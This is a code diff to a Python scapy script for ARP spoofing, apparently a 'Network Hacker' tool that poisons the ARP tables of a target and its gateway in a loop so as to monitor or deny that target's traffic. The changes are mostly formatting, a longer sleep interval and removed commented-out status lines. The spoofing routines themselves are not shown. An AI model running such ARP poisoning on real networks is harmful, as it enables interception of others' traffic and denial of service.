@@ -1,4 +1,5 @@
 import logging
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 import time
 import scapy.all as scapy
@@ -6,6 +7,8 @@ import argparse
 import sys
 import multiprocessing as mp
 import subprocess
+
+
 # import pyfiglet
 # ascii_banner = pyfiglet.figlet_format("Network Hacker",font="banner3-D")
 # print(ascii_banner)
@@ -30,6 +33,7 @@ def get_arguments():
     elif not options.gateway_ip:
         parser.error("[-] Please specify a gateway IP, use --help for more info.")
     return options
+
 
 def get_mac(ip):
     try:
@@ -79,7 +83,7 @@ def start_attack(target_ip, gateway_ip):
     target_mac = get_mac(target_ip)
     gateway_mac = get_mac(gateway_ip)
     if target_mac == 0 or gateway_mac == 0:
-        print("[-] Could not get MAC address of target "+target_ip+" or gateway. Exiting.")
+        print("[-] Could not get MAC address of target " + target_ip + " or gateway. Exiting.")
         return
     count = 0
     while True:
@@ -88,18 +92,8 @@ def start_attack(target_ip, gateway_ip):
         spoof_arp_table(gateway_ip, gateway_mac, target_ip)
         count += 1
         print("\r[+] Packets sent: " + str(count), end="")
-        time.sleep(1)
+        time.sleep(2)
 
-
-# if option.all:
-#     print("\r[+] All Devices in " + gateway_ip + "/24 Network are being " + (
-#         " Denied " if option.mode == 'd' else " Monitored ") + " for " + str(count) + " seconds", end="")
-# elif option.list_ip:
-#     print("\r[+] All Devices in " + option.list_ip + " are being " + (
-#         " Denied " if option.mode == 'd' else " Monitored ") + " for " + str(count) + " seconds", end="")
-# else:
-#     print("\r[+]" + " Traffic of " + target_ip + " has been " + (
-#         " Denied " if option.mode == 'd' else " Monitored ") + " for " + str(count) + " seconds", end="")
 
 if __name__ == "__main__":
     start = time.time()
